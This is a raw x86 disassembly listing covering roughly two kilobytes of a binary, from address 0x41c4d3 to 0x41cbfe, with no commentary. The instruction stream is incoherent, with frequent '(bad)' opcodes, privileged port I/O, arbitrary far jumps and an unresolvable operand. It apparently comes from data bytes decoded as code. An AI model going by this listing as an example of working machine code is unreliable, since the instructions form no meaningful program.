  41c4d3:	imul   edx,DWORD PTR [eax-0x67],0x8ea4cf88
  41c4da:	jp     0x41c464
  41c4dc:	imul   edx,DWORD PTR [esp+edi*8-0x627fb252],0xffffffdf
  41c4e4:	imul   esp,DWORD PTR [esi+esi*2],0x51d19eea
  41c4eb:	xor    al,0x1f
  41c4ed:	and    al,0xed
  41c4ef:	or     al,0xce
  41c4f1:	rcl    DWORD PTR [esi],0x9b
  41c4f4:	sti    
  41c4f5:	sbb    eax,0x362bcd7b
  41c4fa:	sub    al,0x2f
  41c4fc:	into   
  41c4fd:	mov    ecx,0xbba592c5
  41c502:	cmp    al,0xcb
  41c504:	test   eax,0xb005c9ce
  41c509:	in     al,0x34
  41c50b:	(bad)  
  41c50c:	mov    bh,0xd6
  41c50e:	cs inc edi
  41c510:	push   es
  41c511:	in     al,0xbb
  41c513:	lahf   
  41c514:	pop    ds
  41c515:	das    
  41c516:	pop    DWORD PTR [esi+0x6f]
  41c519:	adc    al,0x13
  41c51b:	imul   DWORD PTR [edx+edx*1+0x79f4a1af]
  41c522:	cs loopne 0x41c56b
  41c525:	jae    0x41c58c
  41c527:	shr    al,cl
  41c529:	hlt    
  41c52a:	inc    esp
  41c52b:	fdivr  QWORD PTR [edx]
  41c52d:	jns    0x41c4b6
  41c52f:	sahf   
  41c530:	loop   0x41c5af
  41c532:	inc    edx
  41c533:	test   BYTE PTR [edx],ah
  41c535:	xchg   DWORD PTR [edx+0x3c],ebp
  41c538:	in     eax,0x8e
  41c53a:	xor    al,0xcd
  41c53c:	in     al,dx
  41c53d:	dec    esi
  41c53e:	aas    
  41c53f:	aaa    
  41c540:	xchg   DWORD PTR [edi+0x6c276b9f],eax
  41c546:	test   BYTE PTR [edx],al
  41c548:	shr    ebp,1
  41c54a:	mov    BYTE PTR [edx-0x3070907b],bl
  41c550:	icebp  
  41c551:	push   0xffffffa7
  41c553:	mov    esp,0xa2e91c36
  41c558:	imul   edx,DWORD PTR [ebp-0x7461b65],0x7a05911c
  41c562:	xor    BYTE PTR [edx],0xda
  41c565:	into   
  41c566:	in     al,dx
  41c567:	pop    ebx
  41c568:	push   edx
  41c569:	mov    ds,ecx
  41c56b:	sbb    al,0x3
  41c56d:	ja     0x41c5e7
  41c56f:	xchg   BYTE PTR ds:0x9acac427,ah
  41c575:	xchg   ebp,eax
  41c576:	and    BYTE PTR [eax+edi*1-0x58fcdd42],ah
  41c57d:	mov    ds,WORD PTR ds:0x9271daba
  41c583:	in     eax,dx
  41c584:	jmp    0xc1f:0x48ac99d1
  41c58b:	or     eax,0x32055c22
  41c590:	in     eax,0x9
  41c592:	fisubr DWORD PTR [eax+0x1e]
  41c595:	stos   DWORD PTR es:[edi],eax
  41c596:	or     bl,BYTE PTR [esi-0x4]
  41c599:	pop    esi
  41c59a:	mov    ds:0xdd88c399,eax
  41c59f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5a0:	push   ebp
  41c5a1:	shr    DWORD PTR [ebx+0x7b],0x33
  41c5a5:	push   ecx
  41c5a6:	dec    edi
  41c5a7:	add    al,0x1
  41c5a9:	add    DWORD PTR [ecx-0x1b],ecx
  41c5ac:	sub    BYTE PTR [edi+0x2858e0c0],al
  41c5b2:	pop    ss
  41c5b3:	cmp    al,0xc9
  41c5b5:	xchg   edx,eax
  41c5b6:	mov    esp,ebp
  41c5b8:	add    eax,0x1200ddbe
  41c5bd:	popf   
  41c5be:	imul   BYTE PTR [edi-0x4586c031]
  41c5c4:	imul   ecx,DWORD PTR [ebx],0x2ad67c0c
  41c5ca:	pop    es
  41c5cb:	imul   BYTE PTR [eax]
  41c5cd:	add    al,0xdc
  41c5cf:	ins    BYTE PTR es:[edi],dx
  41c5d0:	mov    WORD PTR [edi-0xfd748d4],gs
  41c5d6:	xor    BYTE PTR [edx],bh
  41c5d8:	int    0x65
  41c5da:	cmp    al,0x69
  41c5dc:	ins    DWORD PTR es:[edi],dx
  41c5dd:	or     eax,0xd3be7c03
  41c5e2:	fild   WORD PTR [eax+0x5]
  41c5e5:	fs pop es
  41c5e7:	sub    BYTE PTR [ebp-0xa5493f5],0x9c
  41c5ee:	sbb    DWORD PTR [esi-0x69713676],0x9812aa3c
  41c5f8:	loope  0x41c604
  41c5fa:	add    edx,esi
  41c5fc:	in     al,dx
  41c5fd:	push   esi
  41c5fe:	adc    eax,0x971a3d18
  41c603:	out    dx,al
  41c604:	xor    dl,bh
  41c606:	fst    QWORD PTR [ebx-0x75]
  41c609:	push   ecx
  41c60a:	pop    ebp
  41c60b:	add    dh,al
  41c60d:	or     DWORD PTR [ebx],0x52a4852
  41c613:	mov    dh,0x91
  41c615:	jbe    0x41c643
  41c617:	stos   DWORD PTR es:[edi],eax
  41c618:	pop    edx
  41c619:	add    DWORD PTR [ebp+0x442fe377],0x5e
  41c620:	out    dx,al
  41c621:	ss jns 0x41c69c
  41c624:	out    dx,eax
  41c625:	mov    ebx,esp
  41c627:	mov    ch,0x18
  41c629:	mov    esp,0xbf277037
  41c62e:	push   0xffffff95
  41c630:	aas    
  41c631:	push   edi
  41c632:	dec    ebx
  41c633:	mov    esp,DWORD PTR [esi]
  41c635:	rcl    edx,1
  41c637:	ins    BYTE PTR es:[edi],dx
  41c638:	fstp   QWORD PTR ds:0x8f11d185
  41c63e:	je     0x41c5f5
  41c640:	mov    edi,0x4045145
  41c645:	push   ebx
  41c646:	sbb    DWORD PTR fs:[ebx-0x2c3b9ad0],esi
  41c64d:	jb     0x41c6bf
  41c64f:	std    
  41c650:	adc    BYTE PTR [edi],al
  41c652:	mov    ss,ecx
  41c654:	shl    DWORD PTR [ebp+0x784032e],0x8b
  41c65b:	outs   dx,BYTE PTR ds:[esi]
  41c65c:	(bad)  
  41c65d:	stc    
  41c65e:	jae    0x41c6bc
  41c660:	scas   eax,DWORD PTR es:[edi]
  41c661:	add    bh,cl
  41c663:	daa    
  41c664:	jo     0x41c5e6
  41c666:	not    BYTE PTR [ebp-0x1c565a34]
  41c66c:	mov    BYTE PTR [bp+di],0xf6
  41c670:	sbb    BYTE PTR [esi*4-0x55794bbc],ah
  41c677:	mov    BYTE PTR [eax-0x5e5d8fa4],0x2a
  41c67e:	les    ebx,FWORD PTR [esp+eax*1-0x8]
  41c682:	pop    edx
  41c683:	mov    dl,0x37
  41c685:	rol    ebx,cl
  41c687:	push   0xf413b911
  41c68c:	cmp    BYTE PTR [edi],ah
  41c68e:	inc    ecx
  41c68f:	pop    ebx
  41c690:	push   ecx
  41c691:	jmp    0x41c67a
  41c693:	pushf  
  41c694:	adc    eax,0x611d42a7
  41c699:	cmp    al,0x99
  41c69b:	popf   
  41c69c:	inc    edx
  41c69d:	out    dx,eax
  41c69e:	fs dec ebp
  41c6a0:	(bad)  
  41c6a1:	dec    esp
  41c6a2:	inc    esp
  41c6a3:	les    ebp,FWORD PTR [ecx-0x220f796b]
  41c6a9:	hlt    
  41c6aa:	jg     0x41c65c
  41c6ac:	repnz push ebx
  41c6ae:	nop
  41c6af:	jnp    0x41c688
  41c6b1:	or     cl,ch
  41c6b3:	enter  0xaffc,0x77
  41c6b7:	stc    
  41c6b8:	inc    ebp
  41c6b9:	dec    ebx
  41c6ba:	sub    DWORD PTR [edi],ecx
  41c6bc:	in     eax,dx
  41c6bd:	add    BYTE PTR [esi+0x6d],dl
  41c6c0:	fild   WORD PTR [ecx+ecx*1+0x4b2b67d2]
  41c6c7:	jo     0x41c702
  41c6c9:	and    bh,dh
  41c6cb:	xor    al,0xc8
  41c6cd:	jno    0x41c69b
  41c6cf:	add    DWORD PTR [esi],ebp
  41c6d1:	das    
  41c6d2:	push   edx
  41c6d3:	int3   
  41c6d4:	mov    bl,BYTE PTR [ecx]
  41c6d6:	(bad)  
  41c6d7:	test   eax,0xb99da41f
  41c6dc:	ins    BYTE PTR es:[edi],dx
  41c6dd:	xchg   edi,eax
  41c6de:	cmp    BYTE PTR [edi],dh
  41c6e0:	je     0x41c692
  41c6e2:	adc    DWORD PTR [esi-0x20],esi
  41c6e5:	cmovno esp,DWORD PTR [ecx-0x3e56fb26]
  41c6ec:	cmp    DWORD PTR [edx],edi
  41c6ee:	cld    
  41c6ef:	(bad)  
  41c6f0:	aaa    
  41c6f1:	push   es
  41c6f2:	xchg   ecx,eax
  41c6f3:	push   ebx
  41c6f4:	xchg   BYTE PTR [ecx+eax*1-0x3e],cl
  41c6f8:	retf   
  41c6f9:	stos   DWORD PTR es:[edi],eax
  41c6fa:	dec    edx
  41c6fb:	adc    esi,0xb50132e2
  41c701:	mov    eax,0xf6db3f31
  41c706:	cmc    
  41c707:	jge    0x41c729
  41c709:	out    dx,al
  41c70a:	xlat   BYTE PTR ds:[ebx]
  41c70b:	xor    al,0xcb
  41c70d:	std    
  41c70e:	push   ebx
  41c70f:	jle    0x41c770
  41c711:	js     0x41c714
  41c713:	sub    eax,0x2bee193d
  41c718:	shl    BYTE PTR [esi+0x14],1
  41c71b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c71c:	mov    edx,0xb18d275
  41c721:	dec    esp
  41c722:	add    ah,BYTE PTR [edx-0x60]
  41c725:	cmp    ch,cl
  41c727:	sub    ch,BYTE PTR [ebx-0x788be1bb]
  41c72d:	xchg   BYTE PTR [ecx+0x6a],dh
  41c730:	sub    BYTE PTR [esp+ebp*2],bh
  41c733:	jb     0x41c74d
  41c735:	ret    0x624a
  41c738:	or     al,0x94
  41c73a:	sti    
  41c73b:	enter  0xa28f,0xd
  41c73f:	xchg   ebp,eax
  41c740:	mov    al,0xf9
  41c742:	mov    BYTE PTR [ebx],dh
  41c744:	and    al,0x66
  41c746:	push   cs
  41c747:	sbb    al,0x9b
  41c749:	and    dl,BYTE PTR ds:0xbae8332
  41c74f:	push   ss
  41c750:	js     0x41c6ed
  41c752:	pop    edi
  41c753:	mov    ah,0x3
  41c755:	xchg   ebx,eax
  41c756:	push   esp
  41c757:	mov    edx,0xeafb9c6e
  41c75c:	or     edx,DWORD PTR [ebx]
  41c75e:	scas   al,BYTE PTR es:[edi]
  41c75f:	mov    BYTE PTR [eax+eiz*2+0x5c],al
  41c763:	add    ebx,DWORD PTR [edi+esi*8]
  41c766:	or     bl,BYTE PTR [eax]
  41c768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c769:	retf   0xbf2d
  41c76c:	and    bl,al
  41c76e:	inc    esi
  41c76f:	xor    edx,DWORD PTR [edi]
  41c771:	sti    
  41c772:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c773:	imul   DWORD PTR ds:0x6768e3a
  41c779:	fmul   QWORD PTR [eiz*1-0xf0049ec]
  41c780:	or     al,0xd4
  41c782:	int    0x80
  41c784:	in     eax,0xdc
  41c786:	push   eax
  41c787:	lods   al,BYTE PTR ds:[esi]
  41c788:	(bad)  
  41c789:	dec    esp
  41c78a:	(bad)  
  41c78b:	mov    cl,BYTE PTR [ecx]
  41c78d:	add    ebx,0xf
  41c790:	loop   0x41c7e9
  41c792:	fsubrp st(4),st
  41c794:	jo     0x41c77d
  41c796:	and    al,0x40
  41c798:	adc    BYTE PTR [edi-0x74f6be0e],bh
  41c79e:	imul   ebp,DWORD PTR [edi],0xffffffeb
  41c7a1:	call   0x61b99da9
  41c7a6:	adc    eax,DWORD PTR [eax-0x5c6b91ab]
  41c7ac:	pop    ebp
  41c7ad:	adc    BYTE PTR [esi-0x37b5f7d8],ah
  41c7b3:	sbb    esi,ebp
  41c7b5:	dec    eax
  41c7b6:	sti    
  41c7b7:	stc    
  41c7b8:	repnz xchg esp,eax
  41c7ba:	add    DWORD PTR [edx],edi
  41c7bc:	or     cl,BYTE PTR [ebx]
  41c7be:	and    eax,0x7837630d
  41c7c3:	cs cmc 
  41c7c5:	or     eax,DWORD PTR [edx+0xcff5219]
  41c7cb:	jno    0x41c758
  41c7cd:	scas   eax,DWORD PTR es:[edi]
  41c7ce:	mov    bh,0x14
  41c7d0:	inc    edx
  41c7d1:	xchg   DWORD PTR ds:0xbda48ccf,edi
  41c7d7:	push   cs
  41c7d8:	test   esi,esp
  41c7da:	mov    BYTE PTR [ebx+0x268d8a92],al
  41c7e0:	frstor [ebp+0x2c]
  41c7e3:	pushf  
  41c7e4:	inc    ebp
  41c7e5:	mov    esi,ss
  41c7e7:	cdq    
  41c7e8:	in     eax,dx
  41c7e9:	cli    
  41c7ea:	push   ss
  41c7eb:	add    eax,0x4ef72642
  41c7f0:	hlt    
  41c7f1:	dec    edi
  41c7f2:	fwait
  41c7f3:	(bad)  
  41c7f4:	dec    edx
  41c7f5:	ja     0x41c779
  41c7f7:	pop    ss
  41c7f8:	pop    es
  41c7f9:	push   0xffffffb2
  41c7fb:	xchg   edi,eax
  41c7fc:	adc    al,0x29
  41c7fe:	shl    BYTE PTR [edx-0x32],cl
  41c801:	fsubp  st(6),st
  41c803:	push   esi
  41c804:	jp     0x41c874
  41c806:	sub    al,0x63
  41c808:	in     eax,dx
  41c809:	dec    esi
  41c80a:	ss jnp 0x41c797
  41c80d:	inc    eax
  41c80e:	mov    ebp,DWORD PTR [ebx-0xd]
  41c811:	bound  esi,QWORD PTR [eax]
  41c813:	loop   0x41c7e8
  41c815:	mov    edx,0x620c73f0
  41c81a:	mov    ah,cl
  41c81c:	or     eax,0x3590c252
  41c821:	outs   dx,DWORD PTR ds:[esi]
  41c822:	loopne 0x41c7d5
  41c824:	ins    BYTE PTR es:[edi],dx
  41c825:	mov    ch,0xf3
  41c827:	out    0x7a,al
  41c829:	(bad)  
  41c82a:	in     eax,0x60
  41c82c:	dec    edi
  41c82d:	(bad)  
  41c82e:	data16 not BYTE PTR [ecx+eax*8]
  41c832:	clc    
  41c833:	sbb    BYTE PTR [ecx],0x89
  41c836:	pop    ebx
  41c837:	ss inc edx
  41c839:	xor    cl,BYTE PTR [eax-0xd529f01]
  41c83f:	xor    eax,0xcfccf232
  41c844:	loop   0x41c899
  41c846:	inc    ebx
  41c847:	fdiv   QWORD PTR [edi-0x728a5646]
  41c84d:	adc    DWORD PTR [eax+0x6f],esp
  41c850:	sbb    ah,BYTE PTR [esi]
  41c852:	out    dx,al
  41c853:	mov    ds:0xdb80dcab,al
  41c858:	dec    ebp
  41c859:	mov    bh,0xa8
  41c85b:	jg     0x41c8bc
  41c85d:	gs push ds
  41c85f:	xchg   edi,eax
  41c860:	push   ss
  41c861:	sbb    BYTE PTR [ebx],bh
  41c863:	cmp    eax,0xf085919d
  41c868:	popa   
  41c869:	jl     0x41c8d6
  41c86b:	gs lea ebx,ds:[edx]
  41c86f:	xchg   ecx,eax
  41c870:	jbe    0x41c8c2
  41c872:	xchg   edx,esi
  41c874:	xchg   ebx,eax
  41c875:	int3   
  41c876:	and    al,0xc1
  41c878:	leave  
  41c879:	and    dh,BYTE PTR [ebx+0x39]
  41c87c:	xor    esi,DWORD PTR [edx-0x2c]
  41c87f:	jge    0x41c827
  41c881:	sbb    al,0x42
  41c883:	pop    eax
  41c884:	xchg   ebp,eax
  41c885:	jo     0x41c902
  41c887:	repnz add bh,dl
  41c88a:	xor    BYTE PTR [edi-0x60],al
  41c88d:	mov    esp,0x891fd8e7
  41c892:	retf   
  41c893:	sub    BYTE PTR [ecx+0xec0a06c],cl
  41c899:	(bad)  
  41c89a:	adc    BYTE PTR [edx-0x4d],ah
  41c89d:	test   al,0xbb
  41c89f:	nop
  41c8a0:	call   0xd0a35efb
  41c8a5:	cmp    ebp,DWORD PTR [ebx+0x37]
  41c8a8:	mov    eax,0x2bf7ae87
  41c8ad:	xchg   ebx,eax
  41c8ae:	inc    eax
  41c8af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8b0:	cmp    BYTE PTR [ebx-0x7],bl
  41c8b3:	jmp    0xc2ba:0x6ac80a
  41c8ba:	in     eax,0x2f
  41c8bc:	push   eax
  41c8bd:	aas    
  41c8be:	sbb    edx,DWORD PTR [edi]
  41c8c0:	retf   
  41c8c1:	xchg   edi,eax
  41c8c2:	dec    ebp
  41c8c3:	jmp    0x1a377bbe
  41c8c8:	mov    ch,0xc5
  41c8ca:	mov    ds:0x59b1b4ec,al
  41c8cf:	loop   0x41c906
  41c8d1:	jne    0x41c8cd
  41c8d3:	in     al,dx
  41c8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8d5:	push   esp
  41c8d6:	test   eax,0x9974fd22
  41c8db:	add    ebp,ecx
  41c8dd:	ins    BYTE PTR es:[edi],dx
  41c8de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8df:	pop    ebp
  41c8e0:	push   edx
  41c8e1:	xlat   BYTE PTR ds:[ebx]
  41c8e2:	(bad)  
  41c8e3:	(bad)  
  41c8e4:	scas   eax,DWORD PTR es:[edi]
  41c8e5:	push   0x35
  41c8e7:	pop    es
  41c8e8:	pop    ds
  41c8e9:	pop    esi
  41c8ea:	ins    DWORD PTR es:[edi],dx
  41c8eb:	xchg   esp,eax
  41c8ec:	leave  
  41c8ed:	dec    esp
  41c8ee:	xchg   DWORD PTR [ecx+0x55],ebx
  41c8f1:	xchg   esi,eax
  41c8f2:	xchg   esp,eax
  41c8f3:	xchg   ebp,eax
  41c8f4:	hlt    
  41c8f5:	pop    eax
  41c8f6:	cs jmp 0x41c951
  41c8f9:	out    0x6b,al
  41c8fb:	ret    0x6774
  41c8fe:	fnstenv [esi+eax*4-0x59]
  41c902:	inc    ecx
  41c903:	xor    ecx,DWORD PTR [ecx]
  41c905:	out    0x98,eax
  41c907:	mov    eax,ds:0x8a517fbf
  41c90c:	int    0x3f
  41c90e:	pop    esi
  41c90f:	push   ebx
  41c910:	ins    DWORD PTR es:[edi],dx
  41c911:	repz daa 
  41c913:	cmp    eax,0xd94b420a
  41c918:	(bad)  
  41c91a:	push   ebp
  41c91b:	xchg   edx,eax
  41c91c:	daa    
  41c91d:	mov    edi,0x16d28c6
  41c922:	cmp    DWORD PTR [eax],eax
  41c924:	in     al,dx
  41c925:	push   0xf3058c4b
  41c92a:	(bad)  
  41c92b:	xchg   edi,eax
  41c92c:	cmc    
  41c92d:	out    0x38,eax
  41c92f:	push   ds
  41c930:	pop    edx
  41c931:	mov    esi,0xdd972d7d
  41c936:	adc    al,0xd
  41c938:	arpl   WORD PTR [ebx+ebx*1-0x2a],ax
  41c93c:	cmp    esp,DWORD PTR [edx-0x6102397f]
  41c942:	and    al,0x95
  41c944:	jl     0x41c8f1
  41c946:	or     BYTE PTR [esp+ebp*8],ah
  41c949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c94a:	adc    BYTE PTR [ecx+edx*8+0x7b],dh
  41c94e:	cmp    ah,BYTE PTR [eax-0x1b]
  41c951:	loope  0x41c9bc
  41c953:	inc    ebx
  41c954:	rol    DWORD PTR [ecx],1
  41c956:	push   ss
  41c957:	icebp  
  41c958:	(bad)  
  41c959:	cld    
  41c95a:	(bad)  
  41c95b:	test   al,0x4b
  41c95d:	shl    BYTE PTR [eax-0x39b86e8e],0x18
  41c964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c965:	pop    edx
  41c966:	jmp    0x636d9e27
  41c96b:	retf   
  41c96c:	xor    al,0x3d
  41c96e:	xchg   edx,eax
  41c96f:	push   0x256c5552
  41c974:	push   0xfffffffb
  41c976:	ins    DWORD PTR es:[edi],dx
  41c977:	sub    DWORD PTR [eax-0x2d],0x65
  41c97b:	mov    ecx,0x9278a436
  41c980:	test   eax,0x7688f5a2
  41c985:	inc    edi
  41c986:	mov    ds:0x42db2b0f,eax
  41c98b:	(bad)  
  41c98d:	inc    edi
  41c98e:	test   BYTE PTR [eax+0x5a7a2109],dl
  41c994:	mov    bh,0xf
  41c996:	and    BYTE PTR ds:0xc6c606b1,ah
  41c99c:	fcmove st,st(1)
  41c99e:	pop    es
  41c99f:	dec    esi
  41c9a0:	les    edx,FWORD PTR [eax-0x25]
  41c9a3:	sub    cl,BYTE PTR [edi]
  41c9a5:	xchg   ebx,eax
  41c9a6:	cmp    al,0x85
  41c9a8:	int    0xbf
  41c9aa:	jne    0x41c9a8
  41c9ac:	sbb    al,0xcb
  41c9ae:	xor    cl,bh
  41c9b0:	push   cs
  41c9b1:	arpl   WORD PTR [edi],cx
  41c9b3:	inc    edx
  41c9b4:	sbb    BYTE PTR [eax-0x3e],al
  41c9b7:	mov    BYTE PTR [ebx-0x67151e89],ch
  41c9bd:	sti    
  41c9be:	cwde   
  41c9bf:	lock rcl DWORD PTR [edi+eax*2-0x7d],1
  41c9c4:	xor    eax,DWORD PTR [edx+0x7b]
  41c9c7:	sbb    edx,esi
  41c9c9:	cmp    DWORD PTR [edi],esp
  41c9cb:	ss pop esp
  41c9cd:	push   cs
  41c9ce:	call   edi
  41c9d0:	daa    
  41c9d1:	mov    ds:0x2998d101,eax
  41c9d6:	mov    edx,0xdbb5847e
  41c9db:	or     BYTE PTR [edi+0x3c],bl
  41c9de:	addr16 push eax
  41c9e0:	mov    ah,0x8c
  41c9e2:	aaa    
  41c9e3:	jecxz  0x41c9aa
  41c9e5:	test   al,0x2d
  41c9e7:	fistp  WORD PTR [eax-0x80]
  41c9ea:	or     DWORD PTR [esi],edx
  41c9ec:	(bad)  
  41c9ed:	push   eax
  41c9ee:	mov    edx,0x1cbc9768
  41c9f3:	fistp  QWORD PTR [ebx-0xfe791ef]
  41c9f9:	cs ds icebp 
  41c9fc:	adc    DWORD PTR [esi+0x4c],ebp
  41c9ff:	out    dx,eax
  41ca00:	sub    DWORD PTR ds:0xa6078284,ebx
  41ca06:	xchg   ebx,eax
  41ca07:	fcomp  DWORD PTR [ecx+0x3ba8677e]
  41ca0d:	(bad)  
  41ca0e:	and    BYTE PTR [esi-0x26a8887e],bh
  41ca14:	pushf  
  41ca15:	arpl   WORD PTR [esi+0x25],ax
  41ca18:	mov    ecx,0xc9723535
  41ca1d:	or     al,0x4e
  41ca1f:	out    0xb8,eax
  41ca21:	xor    eax,0x45e9f2d9
  41ca26:	aas    
  41ca27:	imul   edi,DWORD PTR [edi+0x6f],0xfe407243
  41ca2e:	ja     0x41ca1c
  41ca30:	and    ah,BYTE PTR [eax+0x78ef6546]
  41ca36:	hlt    
  41ca37:	push   esp
  41ca38:	push   ss
  41ca39:	clc    
  41ca3a:	xor    eax,DWORD PTR [ecx+0x43]
  41ca3d:	or     DWORD PTR [ebp-0x3b],0xffffffe5
  41ca41:	or     bh,cl
  41ca43:	test   BYTE PTR ss:[esi+ebx*2+0x3e],ch
  41ca48:	mov    eax,0xcafbeb75
  41ca4d:	mov    bh,0xdc
  41ca4f:	mov    dl,BYTE PTR [edx]
  41ca51:	cwde   
  41ca52:	sbb    DWORD PTR [ecx-0x1dff557e],edi
  41ca58:	scas   eax,DWORD PTR es:[edi]
  41ca59:	mov    esi,0x1cd5aedb
  41ca5e:	xor    al,0x8
  41ca60:	adc    BYTE PTR [edi],cl
  41ca62:	jne    0x41ca48
  41ca64:	sub    eax,0x6935e793
  41ca69:	mov    gs,WORD PTR [esi]
  41ca6b:	rol    BYTE PTR [ebx-0x3415b21],0xaa
  41ca72:	fnstenv [eax-0x6d]
  41ca75:	sbb    bh,BYTE PTR [edx+0x42b63fb5]
  41ca7b:	or     DWORD PTR [esi+0x4cde49e8],edx
  41ca81:	cmc    
  41ca82:	ret    
  41ca83:	int3   
  41ca84:	arpl   WORD PTR [ebx-0x53],sp
  41ca87:	pop    ebx
  41ca88:	sub    al,0xbd
  41ca8a:	pop    ss
  41ca8b:	adc    eax,0x338d8cea
  41ca90:	xor    eax,0xd573749c
  41ca95:	cmc    
  41ca96:	jmp    0xec48af52
  41ca9b:	lahf   
  41ca9c:	push   ss
  41ca9d:	dec    eax
  41ca9e:	xchg   esp,eax
  41ca9f:	push   ebx
  41caa0:	jns    0x41ca84
  41caa2:	sub    DWORD PTR [esi+0x58f485a0],edi
  41caa8:	push   es
  41caa9:	mov    dh,0x80
  41caab:	aas    
  41caac:	jne    0x41ca7a
  41caae:	test   eax,0x24cca41b
  41cab3:	out    0x10,al
  41cab5:	lods   eax,DWORD PTR ds:[esi]
  41cab6:	sbb    dh,BYTE PTR [esi+0x657c2f2c]
  41cabc:	jmp    0x8a68:0xde5c1a4a
  41cac3:	aad    0x2a
  41cac5:	mov    gs,esi
  41cac7:	fiadd  WORD PTR [ebx+0x53]
  41caca:	std    
  41cacb:	push   eax
  41cacc:	cdq    
  41cacd:	int    0x5c
  41cacf:	inc    esi
  41cad0:	dec    esi
  41cad1:	dec    edi
  41cad2:	xchg   edx,eax
  41cad3:	data16 and cl,BYTE PTR [eax-0x42]
  41cad7:	and    DWORD PTR [eax+0x6d67a1fe],0xffffffbf
  41cade:	out    dx,eax
  41cadf:	jecxz  0x41cac3
  41cae1:	(bad)  
  41cae2:	rcr    DWORD PTR [edx],cl
  41cae4:	mov    ?,WORD PTR [edx]
  41cae6:	xor    BYTE PTR [eax-0x29917ccb],bl
  41caec:	iret   
  41caed:	out    0x3f,al
  41caef:	pop    edx
  41caf0:	test   al,0xd3
  41caf3:	dec    eax
  41caf4:	aas    
  41caf5:	mov    eax,DWORD PTR [eax+ecx*1]
  41caf8:	stos   DWORD PTR es:[edi],eax
  41caf9:	int    0x19
  41cafb:	lods   eax,DWORD PTR ds:[esi]
  41cafc:	dec    eax
  41cafd:	xchg   ecx,eax
  41cafe:	cdq    
  41caff:	popa   
  41cb00:	ret    0xa730
  41cb03:	test   eax,0xc453384f
  41cb08:	jecxz  0x41cab2
  41cb0a:	in     eax,0xe7
  41cb0c:	mov    dh,BYTE PTR [esi+ebx*4-0x604a2735]
  41cb13:	inc    eax
  41cb14:	or     DWORD PTR [esi-0x3d0d8d44],edx
  41cb1a:	jae    0x41caa6
  41cb1c:	cmp    eax,DWORD PTR [esi-0x41f28ac8]
  41cb22:	out    dx,eax
  41cb23:	pushf  
  41cb24:	fcmovnu st,st(7)
  41cb26:	pop    esp
  41cb27:	dec    esp
  41cb28:	inc    edx
  41cb29:	out    dx,al
  41cb2a:	mov    ah,0x85
  41cb2c:	jns    0x41cb6f
  41cb2e:	rol    esp,0xb
  41cb31:	mov    ah,0xb6
  41cb33:	ja     0x41cb69
  41cb35:	retf   0x93e3
  41cb38:	lods   al,BYTE PTR ds:[esi]
  41cb39:	scas   al,BYTE PTR es:[edi]
  41cb3a:	jmp    0x7fc6f5d4
  41cb3f:	inc    ebx
  41cb40:	mov    edi,0x87e2423e
  41cb45:	mov    BYTE PTR [edi-0x40],bl
  41cb48:	inc    esi
  41cb49:	xlat   BYTE PTR ds:[ebx]
  41cb4a:	je     0x41cb8c
  41cb4c:	int    0xda
  41cb4e:	in     al,dx
  41cb4f:	pushf  
  41cb50:	and    DWORD PTR [eax-0x63c6229e],0x25de8467
  41cb5a:	dec    ebx
  41cb5b:	and    DWORD PTR [edi-0x18],ebp
  41cb5e:	cmp    bl,al
  41cb60:	(bad)  
  41cb61:	retf   
  41cb62:	rcr    DWORD PTR [di-0x4823],cl
  41cb67:	xlat   BYTE PTR ds:[ebx]
  41cb68:	in     al,dx
  41cb69:	aam    0x9a
  41cb6b:	(bad)  
  41cb6e:	jge    0x41cb94
  41cb70:	dec    ebx
  41cb71:	jb     0x41cbd1
  41cb73:	repnz inc ebp
  41cb75:	lds    esi,FWORD PTR [ebp-0x57]
  41cb78:	fistp  WORD PTR [eax+0x42]
  41cb7b:	(bad)  
  41cb7c:	or     DWORD PTR [edi+esi*2-0x3b],edi
  41cb80:	mul    DWORD PTR [ebp+0x4d]
  41cb83:	clc    
  41cb84:	add    BYTE PTR [eax+0x5d0d003b],al
  41cb8a:	dec    edi
  41cb8b:	loope  0x41cbd1
  41cb8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb8e:	push   ds
  41cb8f:	sti    
  41cb90:	aaa    
  41cb91:	js     0x41cb4b
  41cb93:	inc    eax
  41cb94:	cdq    
  41cb95:	pusha  
  41cb96:	loope  0x41cb98
  41cb98:	cmp    bh,BYTE PTR [ebp-0x55681b54]
  41cb9e:	inc    esi
  41cb9f:	cmp    al,0x69
  41cba1:	test   DWORD PTR [edx],edx
  41cba3:	xor    esi,DWORD PTR [esi+0x4df6c110]
  41cba9:	out    0x2,eax
  41cbab:	push   eax
  41cbac:	ds in  al,0x30
  41cbaf:	scas   eax,DWORD PTR es:[edi]
  41cbb0:	imul   esp,DWORD PTR [esp+ebx*1],0x1bc4b66f
  41cbb7:	scas   eax,DWORD PTR es:[edi]
  41cbb8:	cmp    eax,esp
  41cbba:	xchg   ecx,eax
  41cbbb:	loope  0x41cbdc
  41cbbd:	out    0x1c,al
  41cbbf:	stos   DWORD PTR es:[edi],eax
  41cbc0:	outs   dx,BYTE PTR ds:[esi]
  41cbc1:	fsubr  st(3),st
  41cbc3:	and    ebx,DWORD PTR [edi+ebp*8-0x4d2b5136]
  41cbca:	ds ins BYTE PTR es:[edi],dx
  41cbcc:	xchg   BYTE PTR [esi+0x4320bfa],bh
  41cbd2:	imul   DWORD PTR [bx+si-0x3d63]
  41cbd7:	xchg   ebp,eax
  41cbd8:	fwait
  41cbd9:	idiv   DWORD PTR [edi]
  41cbdb:	mov    bl,0xed
  41cbdd:	pop    DWORD PTR [ebx+0x16]
  41cbe0:	cli    
  41cbe1:	jmp    0xc56e61b2
  41cbe6:	mov    al,ds:0x6a4da92e
  41cbeb:	(bad)  
  41cbec:	in     eax,dx
  41cbed:	dec    ebp
  41cbee:	mov    al,0x13
  41cbf0:	and    bh,BYTE PTR [esp+edi*8]
  41cbf3:	sbb    BYTE PTR [ebp+0x3b84f049],0xcf
  41cbfa:	adc    ah,0xe6
  41cbfd:	out    dx,eax
  41cbfe:	xchg   esp,eax
